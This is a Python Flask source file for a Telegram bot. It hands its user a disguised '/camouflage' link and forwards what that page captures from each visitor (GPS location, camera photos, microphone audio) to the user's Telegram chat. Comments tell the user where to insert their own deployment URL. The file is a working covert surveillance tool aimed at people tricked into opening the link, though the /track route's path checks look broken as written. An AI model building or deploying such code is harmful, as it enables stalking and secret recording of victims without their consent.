import os
import json
import base64
import tempfile
import requests
from flask import Flask, request, render_template, jsonify
from telegram import Update
from database import create_session, get_chat_id

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise Exception("BOT_TOKEN missing")

# Telegram API URL
TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

def send_message(chat_id, text):
    requests.post(f"{TG_API}/sendMessage", json={"chat_id": chat_id, "text": text})

def send_photo(chat_id, photo_path):
    with open(photo_path, "rb") as f:
        requests.post(f"{TG_API}/sendPhoto", data={"chat_id": chat_id}, files={"photo": f})

def send_audio(chat_id, audio_path):
    with open(audio_path, "rb") as f:
        requests.post(f"{TG_API}/sendAudio", data={"chat_id": chat_id}, files={"audio": f})

def send_to_telegram(chat_id, data_type, content):
    if data_type == "location":
        lat = content["lat"]
        lon = content["lon"]
        acc = content["acc"]
        send_message(chat_id, f"📍 Location: {lat}, {lon}\nAccuracy: {acc}m")
    elif data_type == "photo":
        header, encoded = content.split(",", 1)
        img_data = base64.b64decode(encoded)
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
            f.write(img_data)
            tmp = f.name
        send_photo(chat_id, tmp)
        os.unlink(tmp)
    elif data_type == "audio":
        header, encoded = content.split(",", 1)
        audio_data = base64.b64decode(encoded)
        with tempfile.NamedTemporaryFile(suffix=".webm", delete=False) as f:
            f.write(audio_data)
            tmp = f.name
        send_audio(chat_id, tmp)
        os.unlink(tmp)

@app.route('/camouflage')
def camouflage():
    session_id = request.args.get('session')
    if not session_id or not get_chat_id(session_id):
        return "Invalid link", 404
    return render_template('camouflage.html')

@app.route('/track', methods=['POST'])
def track():
    session_id = request.args.get('session')
    chat_id = get_chat_id(session_id)
    if not chat_id:
        return jsonify({"error": "Invalid session"}), 400
    data = request.get_json()
    path = request.path
    if '/location' in path:
        send_to_telegram(chat_id, "location", data)
    elif '/photo' in path:
        send_to_telegram(chat_id, "photo", data.get("image"))
    elif '/audio' in path:
        send_to_telegram(chat_id, "audio", data.get("audio"))
    return jsonify({"status": "ok"})

@app.route('/webhook', methods=['POST'])
def webhook():
    json_str = request.get_data(as_text=True)
    try:
        update = Update.de_json(json.loads(json_str), None)  # bot param not needed for update
        if update.message and update.message.text and update.message.text.startswith('/start'):
            chat_id = update.message.chat.id
            session_id = create_session(chat_id)
            public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://clahac.onrender.com")  # ← YAHAN APNA URL DAAL
            link = f"{public_url}/camouflage?session={session_id}"
            send_message(chat_id, f"✅ Link ready:\n{link}")
        return "ok"
    except Exception as e:
        print(f"Webhook error: {e}")
        return "error", 500

# Set webhook on startup
def set_webhook():
    public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://clahac.onrender.com")  # ← YAHAN BHI APNA URL DAAL
    webhook_url = f"{public_url}/webhook"
    r = requests.post(f"{TG_API}/setWebhook", json={"url": webhook_url})
    print(f"Webhook set: {r.text}")

set_webhook()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
